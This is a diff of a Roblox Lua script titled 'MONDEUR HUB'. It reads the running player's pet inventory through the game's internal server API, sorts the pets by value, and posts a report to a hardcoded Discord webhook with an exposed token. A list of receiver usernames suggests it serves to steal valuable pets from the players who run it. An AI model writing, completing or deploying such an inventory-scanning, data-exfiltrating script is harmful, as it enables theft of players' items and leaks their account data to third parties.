@@ -1,4 +1,4 @@
--- [[ MONDEUR HUB | FINAL STABLE V7 ]] --
+-- [[ MONDEUR HUB | FINAL MAX V7 STABLE ]] --
 local HttpService       = game:GetService("HttpService")
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,17 +9,16 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWS
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
 
 --------------------------------------------------------------
--- CRASH PROTECTOR: WAIT FOR SERVER DATA
+-- CRASH PROTECTOR: WAIT FOR GAME LOAD
 --------------------------------------------------------------
 if not game:IsLoaded() then game.Loaded:Wait() end
 local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60)
 local Fsys2 = require(Fsys)
 local load = Fsys2.load
-local routerClient = load("RouterClient")
 local InventoryDB = load("InventoryDB")
 
 --------------------------------------------------------------
--- THE UNIQUE UI DESIGN
+-- UI DESIGN
 --------------------------------------------------------------
 local function sendMondeurReport(pets, totalVal, totalCount, receiver)
     local request = (syn and syn.request) or http_request or request
@@ -70,32 +69,32 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
 end
 
 --------------------------------------------------------------
--- CORE SCAN LOGIC (Fixed Sorting & Crash)
+-- CORE SCAN LOGIC (Using direct GetInventory for stability)
 --------------------------------------------------------------
 local function execute()
-    local allData = routerClient.get("DataAPI/GetAllServerData"):InvokeServer()
-    -- Deep check to prevent indexing nil (Line 76 fix)
-    local playerKey = (allData and allData[LocalPlayer.Name]) and LocalPlayer.Name or tostring(LocalPlayer.UserId)
+    local success, inv = pcall(function() 
+        return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
+    end)
     
-    if not allData or not allData[playerKey] or not allData[playerKey].inventory then 
-        warn("Inventory data not ready, retrying...")
+    if not success or not inv then 
+        warn("Inventory not accessible yet, retrying...")
         return 
     end
 
-    local rawPets = allData[playerKey].inventory.pets
     local pets, totalVal, totalCount = {}, 0, 0
     
-    for _, item in pairs(rawPets) do
-        local petData = InventoryDB.pets[item.id]
-        if petData then
+    for _, item in pairs(inv) do
+        if item.Kind == "Pet" then
             totalCount = totalCount + 1
+            local petData = InventoryDB.pets[item.id]
+            -- Value detection from item properties
             local val = (item.properties and item.properties.value) or 0
-            table.insert(pets, {name = petData.name or "Unknown", value = val})
+            table.insert(pets, {name = (petData and petData.name) or "Unknown", value = val})
             totalVal = totalVal + val
         end
     end
 
-    -- Sorting by value (Highest to Lowest)
+    -- Value-based sorting
     table.sort(pets, function(a, b) return a.value > b.value end)
 
     local target = nil
@@ -108,8 +107,5 @@ end
 
 -- Execution Loop
 task.spawn(function()
-    while true do
-        pcall(execute)
-        task.wait(10) -- Scans every 10 seconds
-    end
+    execute() -- Initial run
 end)
